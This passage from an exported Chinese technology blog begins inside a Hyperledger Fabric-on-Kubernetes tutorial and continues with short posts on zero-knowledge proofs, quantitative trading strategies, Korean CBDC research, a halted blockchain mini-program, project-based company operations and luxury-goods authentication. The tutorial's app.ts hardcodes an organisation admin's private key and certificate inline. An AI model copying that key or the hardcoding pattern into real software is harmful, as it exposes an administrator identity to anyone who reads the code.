Gateway();</span><br><span class="line">        const wallet &#x3D; await buildWallet(walletPath);</span><br><span class="line"></span><br><span class="line">        const identity: X509Identity &#x3D; &#123;</span><br><span class="line">            credentials: &#123;</span><br><span class="line">                &#x2F;&#x2F;crypto-config\peerOrganizations\org1\users\Admin@org1\msp\signcerts\Admin@org1-cert.pem</span><br><span class="line">                certificate: &#39;-----BEGIN CERTIFICATE-----\nMIICBjCCAaygAwIBAgIRAKeXh5QGRlhFCf31amakNiowCgYIKoZIzj0EAwIwWzEL</span><br><span class="line">                &#x2F;&#x2F;crypto-config\peerOrganizations\org1\users\Admin@org1\msp\keystore</span><br><span class="line">                privateKey: &#39;-----BEGIN PRIVATE KEY-----\nMIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg9tkGBGl8aIWYbN&#x2F;i\nqKjl5dK3D3qXx6ltn3YrlH4NFPehRANCAATMJIf0mY3FQDysZOevzbsBwqttfVuW\nwoIFV9Z0TwBEXXAQ0HPd9u77zV4my0onty3rJnWKF2kuhIn5PUzz61zk\n-----END PRIVATE KEY-----\n&#39;,</span><br><span class="line">            &#125;,</span><br><span class="line">            mspId: org1UserId,</span><br><span class="line">            type: &#39;X.509&#39;,</span><br><span class="line">        &#125;;</span><br><span class="line">        await wallet.put(org1UserId, identity);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        const gatewayOpts: GatewayOptions &#x3D; &#123;</span><br><span class="line">            wallet,</span><br><span class="line">            identity: org1UserId,</span><br><span class="line">            discovery: &#123; enabled: false, asLocalhost: false &#125;, &#x2F;&#x2F; using asLocalhost as this gateway is using a fabric network deployed locally</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        await gateway.connect(connectionProfile, gatewayOpts);</span><br><span class="line"></span><br><span class="line">        const network &#x3D; await gateway.getNetwork(&#39;mychannel&#39;);</span><br><span class="line"></span><br><span class="line">        const contract &#x3D; network.getContract(&#39;marbles&#39;);</span><br><span class="line">        let result &#x3D; await contract.evaluateTransaction(&#39;readMarble&#39;, &#39;marble2&#39;);</span><br><span class="line">        console.log(&#96;*** Result: $&#123;prettyJSONString(result.toString())&#125;&#96;);</span><br><span class="line">    &#125; catch (error) &#123;</span><br><span class="line">        console.error(&#96;******** FAILED to run the application: $&#123;error&#125;&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>


<p>上述为app.ts，此app.ts会读取connection.json档，此档用于定义peer url以及peer的tls凭证路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;name&quot;: &quot;Network&quot;,</span><br><span class="line">	&quot;version&quot;: &quot;1.1&quot;,</span><br><span class="line">	&quot;channels&quot;: &#123;</span><br><span class="line">		&quot;mychannel&quot;: &#123;</span><br><span class="line">			&quot;peers&quot;: [</span><br><span class="line">				&quot;peer0-org1&quot;,</span><br><span class="line">				&quot;peer0-org2&quot;</span><br><span class="line">			]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;organizations&quot;: &#123;</span><br><span class="line">		&quot;Org1&quot;: &#123;</span><br><span class="line">			&quot;mspid&quot;: &quot;org1MSP&quot;,</span><br><span class="line">			&quot;peers&quot;: [</span><br><span class="line">				&quot;peer0-org1&quot;</span><br><span class="line">			]</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;Org2&quot;: &#123;</span><br><span class="line">			&quot;mspid&quot;: &quot;org2MSP&quot;,</span><br><span class="line">			&quot;peers&quot;: [</span><br><span class="line">				&quot;peer0-org2&quot;</span><br><span class="line">			]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;peers&quot;: &#123;</span><br><span class="line">		&quot;peer0-org1&quot;: &#123;</span><br><span class="line">			&quot;url&quot;: &quot;grpcs:&#x2F;&#x2F;peer0-org1:7051&quot;,</span><br><span class="line">			&quot;grpcOptions&quot;: &#123;</span><br><span class="line">				&quot;ssl-target-name-override&quot;: &quot;peer0-org1&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&quot;tlsCACerts&quot;: &#123;</span><br><span class="line">				&quot;path&quot;: &quot;crypto-config\peerOrganizations\org1\tlsca\tlsca.org1-cert.pem&quot;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;peer0-org2&quot;: &#123;</span><br><span class="line">			&quot;url&quot;: &quot;grpcs:&#x2F;&#x2F;peer0-org2:7051&quot;,</span><br><span class="line">			&quot;grpcOptions&quot;: &#123;</span><br><span class="line">				&quot;ssl-target-name-override&quot;: &quot;peer0-org2&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&quot;tlsCACerts&quot;: &#123;</span><br><span class="line">				&quot;path&quot;: &quot;crypto-config\peerOrganizations\org2\tlsca\tlsca.org2-cert.pem&quot;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>application连到peer的时候必须要有tls 凭证去验证peer service是否安全及正确。</li>
<li>当交易的时候需要提供该使用者(user or admin)的交易凭证(x509 cert +private key)</li>
</ul>
<blockquote>
<p>路径对应如下：<br><strong>tls CA Cert：</strong> crypto-config\peerOrganizations\org1\tlsca\tlsca.org1-cert.pem<br><strong>X509 certificate：</strong> crypto-config\peerOrganizations\org1\users\Admin@org1\msp\signcerts\Admin@org1-cert.pem<br><strong>X509 privateKey：</strong> crypto-config\peerOrganizations\org1\users\Admin@org1\msp\keystore\priv_sk<br>[color=#d85887]</p>
</blockquote>
<p>成功收到资料如图<br><img src="/2021/08/09/%E9%83%A8%E7%BD%B2fabric%E4%BA%8Ek8s%E4%B9%8B%E4%B8%8A/2.png"></p>
<hr>
<h3 id="附录、参考连结"><a href="#附录、参考连结" class="headerlink" title="附录、参考连结"></a>附录、参考连结</h3><ol>
<li>Hyperledger 参考链接</li>
</ol>
<ul>
<li><a href="https://hyperledger-fabric.readthedocs.io/zh_CN/release-2.2/whatis.html#">Hyperledger 官方文件</a></li>
<li><a href="https://github.com/hyperledger/fabric-samples/tree/v2.1.1">Hyperledger Git Repository</a></li>
<li><a href="https://hyperledgercn.github.io/hyperledgerDocs/">Hyperledger 中文文档</a></li>
<li><a href="https://www.lijiaocn.com/%E9%A1%B9%E7%9B%AE/2018/04/26/hyperledger-fabric-deploy.html">Hyperledger 手动部署全纪录</a></li>
<li><a href="https://medium.com/swlh/how-to-implement-hyperledger-fabric-external-chaincodes-within-a-kubernetes-cluster-fd01d7544523">部署Hyperledger2.2 于 Kubenetes</a></li>
<li><a href="https://github.com/vanitas92/fabric-external-chaincodes/tree/v2.2.0">部署Hyperledger2.2 于 Kubenetes 代码</a></li>
<li><a href="https://www.jianshu.com/p/134024f823a0">凭证说明</a></li>
</ul>
<ol start="2">
<li>Kubenetes 参考链接</li>
</ol>
<ul>
<li><a href="https://kubernetes.io/docs/reference/kubectl/docker-cli-to-kubectl/">k8s 佈署用指令參考</a></li>
</ul>
<ol start="3">
<li>NFS 架构参考链接</li>
</ol>
<ul>
<li><a href="https://blog.skywebster.com/how-to-setup-nfs-server-on-centos-7-rhel-7/">NFS 架构参考</a></li>
</ul>
<ol start="4">
<li><p>部署 fabric 和 CA 与 Kubenetes 之上</p>
<p><a href="https://github.com/WillZhuang/hyperledger-fabric-k8s">Deploy Hyperledger Fabric network on Kubernetes</a></p>
</li>
</ol>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>零知识证明比较与分析</title>
    <url>/2020/05/19/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E6%AF%94%E8%BE%83%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<ul>
<li>Zero-Knowledge Proofs ==&gt; <a href="https://zkp.science/">https://zkp.science/</a></li>
<li><a href="https://github.com/matter-labs/awesome-zero-knowledge-proofs">https://github.com/matter-labs/awesome-zero-knowledge-proofs</a></li>
</ul>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>量化交易策略分类</title>
    <url>/2024/03/06/%E9%87%8F%E5%8C%96%E4%BA%A4%E6%98%93%E7%AD%96%E7%95%A5%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<p>量化交易策略可以分为两大类，具体如下。</p>
<ol>
<li>定量策略<br>这类策略主要根据定量分析结果进行交易决策。常见的定量策略有以下几种。<br> (1) 动量策略:通过动量指标判断市场和股票趋势，在趋势形成时买入，在趋势反转时卖出。<br> (2) 价值策略:通过基本面和定量指标判断股票价值，在价值被低估时买人，在价值被高估时卖出。<br> (3) 机器学习策略:利用机器学习算法分析大量数据寻找交易信号，进行机器自动化交易。</li>
<li>定性策略<br>这类策略主要根据定性分析和交易者主观判断进行交易。常见的定性策略有以下几种。<br> (1) 趋势跟随策略:通过图形分析方法判断市场趋势，跟随上升趋势买人，跟随下跌趋势卖出。<br> (2) 消息驱动策略:根据新闻事件和消息判断股票趋势，在利好消息出现时买人，在利空消息出现时卖出。<br> (3) 经验主义策略:根据交易者的经验和主观判断进行交易决策，难以形式化与定量化。<br>综上，交易策略是交易的指导思想和行动纲领。通过研究市场规律和价格行为，选择适合自己风格与能力的策略，并不断优化和调整，最终实现稳定的投资收益，这是每个交易者和投资者的重要学习课题。选择一种适合自己的交易策略，对交易至关重要。</li>
</ol>
]]></content>
      <tags>
        <tag>量化交易</tag>
      </tags>
  </entry>
  <entry>
    <title>韩国央行数字货币</title>
    <url>/2024/04/18/%E9%9F%A9%E5%9B%BD%E5%A4%AE%E8%A1%8C%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/</url>
    <content><![CDATA[<p>Cos-CBDC: Design and Implementation of CBDC on Cosmos Blockchain:<br><a href="https://www.ieice.org/publications/proceedings/bin/pdf_link.php?fname=p303-han.pdf&amp;iconf=APNOMS&amp;year=2021&amp;vol=67&amp;number=TS8-4&amp;lang=E">https://www.ieice.org/publications/proceedings/bin/pdf_link.php?fname=p303-han.pdf&amp;iconf=APNOMS&amp;year=2021&amp;vol=67&amp;number=TS8-4&amp;lang=E</a></p>
<ul>
<li>Cos-CBDC, a CBDC system based on Cosmos blockchain. The transaction capacity of Cos-CBDC can be up to <strong>15,000 TPS</strong> depending on the block size and the number of validators in the BFT-based consensus algorithm.</li>
<li>R3 Corda and Hyperledger Fabric as the blockchain platforms for CBDC, these platforms are not suitable for implementing cross border payments. COSMOS IBC allow different types of blockchains to trade tokens and data with each other.</li>
<li>cos-CBDC propose multi signature (Multisig) and Multi-party computation (MPC). E.g. Central Bank, Commercial Bank, Customer, these 3 parties  generate a Group Key with MPC. This Group Key.</li>
</ul>
<p>The Bank of Korea’s CBDC research:<br><a href="https://www.bis.org/publ/bppdf/bispap123_m.pdf">https://www.bis.org/publ/bppdf/bispap123_m.pdf</a></p>
<ul>
<li>there is no immediate need to issue CBDC in Korea. Therefore, the BOK is actively engaging in research and preparations so that if a decision is made in the future regarding the introduction of CBDC, it can be issued without any delay.</li>
<li>Key considerations in the BOK’s CBDC research<ul>
<li>The decline in the use of cash.</li>
<li>Big tech’s market dominance and concentration of personal information.</li>
<li>The proliferation of global stablecoins.</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>CBDC</tag>
      </tags>
  </entry>
  <entry>
    <title>首个区块链小程序上线首日即叫停</title>
    <url>/2018/05/10/%E9%A6%96%E4%B8%AA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%BA%BF%E9%A6%96%E6%97%A5%E5%8D%B3%E5%8F%AB%E5%81%9C/</url>
    <content><![CDATA[<p>这款区块链小程序“小协议”，用户只需输入协议的标题和内容，可以选择是否加密存储协议内容，支付一定的服务费（费用和字数正相关），生成协议，甲方将协议微信转发乙方，乙方同意之后，这份协议就会被写入以太坊网络。</p>
<p><img src="/2018/05/10/%E9%A6%96%E4%B8%AA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%BA%BF%E9%A6%96%E6%97%A5%E5%8D%B3%E5%8F%AB%E5%81%9C/1.png"></p>
<p>在使用小协议时，不需要用户购买以太坊进行支付，直接微信支付人民币，小协议会在后台用以太坊帮写入用户所需要的数据。全部过程都在微信里完成。</p>
<p>据了解，小协议会读取甲方和乙方的微信ID，这是固定的身份标识，背后通常绑定了很多个人核心信息，例如手机号、银行卡、指纹等等，安全性较高，易验证。这解决了电子合同的身份验证问题。</p>
<p>会话秘钥是指甲方创建协议和乙方确认协议时，根据当时的时间戳，在微信系统内生成的一次记录值，这秘钥是可变的，只和本次会话挂钩。这解决了签订时间的问题。</p>
<p>另外，小协议的显现载体是通过图片为载体来显现合同内容的，因此解决了显现载体的问题。</p>
<p>但是，一份有法律效应的协议，除了不可篡改且能验明身份，还需要得到现有法律的支持，不然出了纠纷，法院也无法解决问题，这个协议就变得没有意义。这也许是此次“小协议”暂停服务的重要原因之一。国内对电子协议是有专门立法的，但是在具体执行上，存在一些不认可的领域，尤其是涉及到大额交易时。</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>项目型公司的商业模式</title>
    <url>/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>转自  <a href="https://mp.weixin.qq.com/s?__biz=MzI5MzMzODE5MQ==&mid=2247487472&idx=1&sn=2a25673fc38bf773696aadc3cef984a1&chksm=ec72e2d0db056bc68456d7fa0d0d916229581e76fe76d8b2c0e423deadeae209d8e9251a3b66&mpshare=1&scene=24&srcid=&sharer_sharetime=1582335838599&sharer_shareid=df06ad3b18ff46aee92c57b5322b6917&key=fe5b7cbb58f3b3700a3bd14d0fa77ad4acc3ef6f6964c6885867ab1c21922369afa76b31b524ae9b8e32fb768ea1245aeba3691f226253c311f3a01254747e3edd9deabf6c41f74e35b0d8b3f5732d88&ascene=14&uin=MjY4NjE1NTk4MQ==&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AbWMEVWe099cNaFWcYvkeu4=&pass_ticket=k+dqhwXYiC9oaOSfLqQ50TuJE38FKNBOjudSiD8kv9GBW1HvtY6ZKbLDdMS/34tT">陈果George</a> 的公众号文章。</p>
<p>IT、咨询、工程设计等等<strong>以人员作为主要资源，公司内部为专业/行业/区域等多维度矩阵式组织，面向客户以“项目”为形式开展服务交付</strong>的商业模式，我称为“专业服务项目型公司”，运维和产品业务不在此列。</p>
<p>项目型公司的主要运营流程是：</p>
<p><strong>销售管理：</strong>开展销售活动，管理客户（account）和商机漏斗（pipeline），根据不同的“成单概率”来分别管理商机，驱动销售转化效率</p>
<p><strong>合同管理：</strong>客户签单，亦即签署项目合同，之前，需要进行合同评审， 包括法务、价格、资源、技术方案、风险等控制环节</p>
<p><strong>立项管理：</strong>根据客户合同进行项目立项，驱动合同向收入的转化效率和速度，尤其是上市公司，需要达成当期的财务目标</p>
<p><strong>项目管理：</strong>向客户交付项目，这类公司运营特点是项目有一定的周期，短则几个月，长则几年，公司的利润由项目利润构成，必须加强项目过程控制，方能确保公司利润目标达成，因而项目过程中一方面要确保项目进度，驱动收入达成，另一方面要确保项目质量，控制风险，按月滚动预测未来的资源投入以及到项目结束时的利润。</p>
<p><strong>资源管理：</strong>项目主要成本是人工资源投入，作为项目型企业组织结构的特点，这些专业人员人事关系上属于专业资源池，根据需要在项目中开展工作，填报项目工时，相应地依据其工时标准成本计入项目成本，“收费工时比率”（Utilization或billability）是公司运营效率的重要指标，从损益表角度看，资源池的总体工时，能被记入项目的部分成为能转化收入的成本，而剩余不能被记入项目的部分，则成为公司管理费用</p>
<p><strong>费用管理：</strong>其他成本、费用的管理，包括项目相关的分包、差旅，以及公司管理费</p>
<p><strong>产能管理：</strong>公司的不同服务产品（Offering）需要不同专业能力的资源，前端销售以及项目交付产生的资源需求和资源池里专业合适的资源供给需要滚动匹配，这就是项目型公司的供应链管理，保证产销平衡，跟制造业供应链管理的原理完全一样，组织上，类似于制造业的供应链管理中心，服务公司也要有资源（Resource）和产能（Capacity）管理（R&amp;CM）部门。</p>
<p><strong>体验管理：</strong>服务业是people business，只有满意敬业的员工，才有满意付钱的客户，才会有公司的利润，因而需要密切监控员工和顾客的满意度。</p>
<p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/1.jpeg"></p>
<p>基于这样的运营体系，公司在<strong>周度、月度、季度的经营分析</strong>上，通常需要利用这些KPI，来分析、监控公司以及各事业部的运营情况，如上图所示。</p>
<p>需要说明，这些KPI取数的具体口径和时间点，取决于管理需要和会计核算原则，有些按月，有些可以到周，有些为当期数或当期（季/年）累积数，有些为到期末（季/年）预测数：</p>
<p><strong>1、利润KPI：</strong>公司及各条线事业部的经营毛利</p>
<p><strong>2、收入KPI：</strong>各条线事业部的营业收入，由项目转化而来；新签单以及在手订单未交付额（backlog）是收入来源</p>
<p><strong>3、合同前收入KPI：</strong>客户已经确认订单，但是合同尚处于签署流程中，尚未开首付款发票，本着谨慎会计原则，在合同前开工，提前转化收入，这对上市公司增加收入具有重要意义</p>
<p><strong>4、签单KPI：</strong>实际已签署合同签署金额（signings）</p>
<p><strong>5、商机KPI：</strong>按预计金额、成单时间和成单概率报告的数字，滚动的签单预测尤为重要，在一个季度内，对于成单概率高（例如90%，75%阶段）的商机，要按周承诺（commit）签单数字，对重点销售项目要明确提出并跟进关单措施，如果出现承诺订单滑掉，要紧抓中概率（例如50%阶段）商机；同时，对本季以后的未来半年到一年的商机要有一定的可视度，保证运营健康</p>
<p><strong>6、交付质量KPI：</strong>从各个事业部角度，要制定总体项目管理的综合性评价指标，这是一个动态性指标，按月按项目更新并汇总，包括预测项目毛利率，预测成本离计划成本的偏差、流程合规性要求等，同时，对重点项目和重点负面问题项目（严重成本超支）要专项列示，并提出改进措施</p>
<p><strong>7、资源管理KPI：</strong>如果实现了有效的工时管理制度，资源利用指标可分为收费（billable/chargeable）利用率和有效（productive）利用率，后者包括了前者以及研发、售前支持等有效但不产生收入的活动，资源利用率是公司的生命线指标，如果低于一定的值，说明资源严重闲置，要不是产能管理的问题（签回来的项目没人做，闲的人又不会做新签回来的项目），要不就要限制招人甚至裁员了。</p>
<p><strong>8、分包KPI：</strong>分包需要占成本一定的比率，适当使用分包有助于提高资源利用率；专业服务公司使用分包的主要目的不是降低成本，而是优化资源利用率。</p>
<p><strong>9、应收和坏账KPI：</strong>半年以上的应收账、坏账计提、已计提坏账回收等分事业部的指标，以及重大项目列示，对利润有直接影响</p>
<p><strong>10、需求和能力KPI：</strong>和供应链管理完全一样，需要从需求（demand）和供给（supply）两方面，从专业能力维度（打个比方，例如咨询公司的战略咨询、供应链咨询、财务咨询、人力资源咨询、技术咨询）区分，从时间维度看给出未来一段时间已上项目、计划出项目、被项目预定、资源缺口等数据，并给出培训、外包、招聘、招聘计划到岗等措施</p>
<p><strong>11、体验KPI：</strong>公司员工在项目中工作，项目中进行周期性员工满意度调研，形成综合的员工满意度指标；客户满意度指标原理类似。</p>
<p>专业服务项目型公司一般基于下图这样的组织架构和责任中心体系来开展运作：矩阵式的客户维度和专业维度的负责人（例如咨询公司的合伙人）开展合作；每个项目的主责，可能属于两个维度中的任何一个；管控上，要做到组织利润中心和项目利润中心的权责匹配。</p>
<p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/2.png"></p>
<p>专业服务公司的<strong>核心业务流程</strong>是销售管理和项目管理，相应地<strong>支持性流程</strong>有财务管理、资源管理以及运营监控等。运用IT工具来支撑这些业务流程，有利于加强项目管控、促进协作、控制风险。</p>
<p>传统ERP软件的项目模块（例如SAP ERP的PS模块）解决了项目供应链、项目计划/活动和项目成本等项目相关业务和管理活动的集成，而专业项目管理软件（例如著名的Oracle Primavera）则专长于复杂的项目计划、项目合同、资源和排程优化等。然而，由于“企业项目”的多种特性类型，通用项目型ERP很难具体适用于企业各种类型的项目管理。</p>
<p>在项目型ERP领域里有20多年历史的SAP ERP，直到2014年后才推出了适用于专业服务项目管理的商务项目管理（Commercial Project Management）模块，简称CPM，下图展示了SAP CPM及覆盖的业务流程范围。CPM是一个架在SAP ERP标准的项目模块（SAP ERP-PS）和商务智能（SAP BO）之上的计划和分析工具；不过，在新版S/4 HANA以及S/4 HANA Cloud里，CPM已经成为标准功能。</p>
<p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/3.jpeg"></p>
<p>![](项目型公司的商</p>
<p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/4.jpeg"></p>
<p>来源：SAP网站</p>
<p>业务管理相关的IT系统主要有：</p>
<p><strong>核心业务系统 —— 管理核心业务流程</strong></p>
<ul>
<li>销售管理CRM系统</li>
<li>项目管理ERP系统</li>
<li>财务系统（和项目管理ERP可以属于一个套件）</li>
</ul>
<p><strong>辅助系统 —— 辅助业务流程</strong></p>
<ul>
<li>合同管理系统</li>
<li>资源管理系统</li>
<li>商务智能报表系统</li>
</ul>
<p><strong>其他相关的应用系统 —— 支持体系</strong>，但是和业务系统有一定的相关性，可以建立系统集成关系</p>
<ul>
<li>HR系统</li>
<li>招聘系统</li>
<li>外包采购系统</li>
<li>差旅报销系统</li>
<li>预算管理系统</li>
</ul>
<p><strong>其他工具系统，</strong>例如：协作工具、敏捷工具、生产平台（例如DevOps）、文档管理、知识管理、培训系统等等</p>
<p>将总体IT应用架构描绘示意如下：</p>
<p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/5.jpeg"></p>
<h3 id="CRM系统"><a href="#CRM系统" class="headerlink" title="CRM系统"></a><strong>CRM系统</strong></h3><p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/6.jpeg"></p>
<p>用CRM系统覆盖上述流程，基于系统的支持，可以为经营管理提供如下重要信息：</p>
<ul>
<li>客户：维护客户信息，一个客户下可以有多个商机</li>
<li>商机：管理商机相关信息，跟踪围绕商机采取的销售活动，其中商机金额和销售阶段（或者成单概率，例如：100%-已签单， 90%-合同流程中， 75%-已中标， 50%-赢面较大，25%-机会评估中）是开展销售控制的主要指标</li>
<li>销售管道报表：总经理、销售负责人和财务负责人根据公司级或事业部级的汇总销售管道报表，推动销售达成，支持对签单及收入作出准确预测</li>
</ul>
<h3 id="商务合同系统"><a href="#商务合同系统" class="headerlink" title="商务合同系统"></a>商务合同系统</h3><p>由于CRM系统主要处理客户、商机、管道的管理，可能不会覆盖到详细的合同、报价等流程，有些对这些流程的内控处理要求高的公司，会有专门的信息系统来管理这个过程。CRM软件和ERP软件多少都会覆盖到这个部分，企业可以根据实际情况来决定架构规划，其通常功能包括：</p>
<p><strong>方案评估：</strong>向客户提交方案建议书或投标方案时，进行方案的技术评估、风险评估，按权限审批</p>
<p><strong>投标和报价流程：</strong>处理投标的商务流程，投标报价按权限审批</p>
<p><strong>合同审批：</strong>进单过程中，对合同（包括：法务条款TOB和工作内容文本SOW）的各级评审并按权限审批，例如：</p>
<ul>
<li>法务评审</li>
<li>财务评审</li>
<li>技术方案评审</li>
<li>资源评审</li>
<li>质量标准/风险评审</li>
<li>其他合规性评审（例如数据安全、贸易限制等）</li>
</ul>
<h3 id="项目ERP系统（项目财务）"><a href="#项目ERP系统（项目财务）" class="headerlink" title="项目ERP系统（项目财务）"></a><strong>项目ERP系统（项目财务）</strong></h3><p>项目型ERP是专业服务项目型公司最核心的业务系统，实现了项目管理的财务业务一体化，从项目往上汇总，形成反映公司运营状况的财务信息。我将项目管理的端到端流程梳理如下：</p>
<p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/7.jpeg"></p>
<p>项目型ERP所覆盖的功能主要包括：</p>
<ul>
<li>项目立项，建立WBS、资源计划、成本预算及项目计划</li>
<li>安排项目资源（即人员）</li>
<li>项目人员每周填报工作，通过方便的time sheet管理，归集项目直接人工成本</li>
<li>其他成本、费用信息可以从财务系统中导入</li>
<li>管理项目变更</li>
<li>月度成本和收入确认</li>
<li>月度进度更新，ETC/EAC成本滚动预测，相应更新项目预算</li>
<li>项目里程碑确认和通知开票</li>
<li>项目状态报表</li>
</ul>
<p>“项目”是公司最小颗粒度的利润中心，是公司收入和利润的根本来源。从公司管理的角度，项目管理需要围绕下图的“项目财务模型”，在报价、合同以及项目执行的这三个环节，动态地关注项目成本和项目毛利（GP）：</p>
<p><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/8.jpeg"></p>
<p>专业服务公司的大多数客户项目都是价格固定、按照工作范围（SOW）投入资源来交付，按里程碑开票收款，这类<strong>固定价格项目</strong>的期间收入确认原则一般采用“完工百分比（POC）”法，而数量相对较少的<strong>运维类项目</strong>采用“期间均摊法”确认收入，<strong>人天类项目（T&amp;M）</strong>采用“按确认人天开票”确认收入。</p>
<p>POC方法要求项目过程中持续维护项目预算，按月归集并确认成本，从而确认收入。不仅如此，为了准确达成公司经营预算，及时发现并控制经营风险，因而，在项目执行中，项目经理及交付责任人（DO）每月开展滚动的项目财务预测显得尤其重要。</p>
<h3 id="资源管理系统"><a href="#资源管理系统" class="headerlink" title="资源管理系统"></a>资源管理系统</h3><p>“资源”是指通过投入时间进项目工作，可以转化为收入的专业人员，例如项目经理、咨询顾问、工程师等。资源管理系统的主要功能是：</p>
<ul>
<li>技能管理：管理每个资源的技能、技能类型分群等</li>
<li>资源计划：相当于制造业的物料需求计划（MRP），将资源技能和项目需求进行匹配，综合管理：资源预留（根据销售或项目情况，book资源）、资源进项目和出项目的时间点预测、需求平衡等等</li>
<li>资源管理执行：资源上项目、下项目的过程管理</li>
</ul>
<p>软件公司采用的团队协作工具，例如Jira，也能很好地管理资源，并跟项目ERP和财务管理系统集成：</p>
<h3 id="财务系统"><a href="#财务系统" class="headerlink" title="财务系统"></a><img src="/2020/02/23/%E9%A1%B9%E7%9B%AE%E5%9E%8B%E5%85%AC%E5%8F%B8%E7%9A%84%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F/9.jpeg" alt="img">财务系统</h3><p>专业服务项目型公司的财务系统和企业标准财务软件并无太大区别，因而本文不再赘述。财务系统和前述的项目ERP系统可以是一个套件，例如SAP、Oracle，也可以分别部署，其覆盖的主要内容有：</p>
<ul>
<li>成本管理：包括成本中心、成本要素和成本对象的管理，从部门、项目、活动类型等多个维度，进行成本费用的归集和分析</li>
<li>应收账管理：尤其关注半年以上账龄的应收账状态，以及坏账计提和回收</li>
<li>总帐管理</li>
</ul>
<h3 id="管理分析报表"><a href="#管理分析报表" class="headerlink" title="管理分析报表"></a>管理分析报表</h3><p>前述六个模块是运营管理的各个环节，这些运营系统数据统一注入企业数据仓库（EDW），通过商业智能平台，向管理者提供各种分析报表。</p>
]]></content>
      <tags>
        <tag>商业模式</tag>
      </tags>
  </entry>
  <entry>
    <title>高价值商品验真</title>
    <url>/2019/10/15/%E9%AB%98%E4%BB%B7%E5%80%BC%E5%95%86%E5%93%81%E9%AA%8C%E7%9C%9F/</url>
    <content><![CDATA[<p><a href="sharma-kdd2017-fake.pdf">https://www.entrupy.com是高价值商品验真的核心技术企业，其论文链接请点击这里 ==&gt;link</a> 此文章发表于2017年，文章内容总结如下：</p>
<h3 id="目前高价值商品验真的技术手段"><a href="#目前高价值商品验真的技术手段" class="headerlink" title="目前高价值商品验真的技术手段"></a>目前高价值商品验真的技术手段</h3><ol>
<li>holograms 全息成像：<a href="https://baike.baidu.com/item/%E5%85%A8%E6%81%AF%E5%9B%BE/11052216?fromtitle=Hologram&fromid=11052204">百度百科链接</a></li>
<li>barcode and RFID supply integrity</li>
</ol>
<p>以上技术存在安全缺陷，标签可以被去除、伪造、复制或者被转移至另一件商品上。</p>
<ol start="3">
<li>taggants 标识剂，例如荧光</li>
<li>PUFs(Physical Unclonable Functions) : 物理不可克隆函数按照实现方法可分为非电子PUF、模拟电路PUF和数字电路PUF。</li>
</ol>
<p>但是4、5方法都过于昂贵，市场难以接受。</p>
<h3 id="本论文讲述的技术手段"><a href="#本论文讲述的技术手段" class="headerlink" title="本论文讲述的技术手段"></a>本论文讲述的技术手段</h3><ol>
<li><p>可便携的、大广角、高倍率的放大镜，并可与手机相结合使用。使用此放大镜为商品拍摄大面积的高清照片。放大倍数为200-300x，精度为1cm*1cm。图片同时配有商品特性的文字说明。</p>
</li>
<li><p>AI算法为商品分类</p>
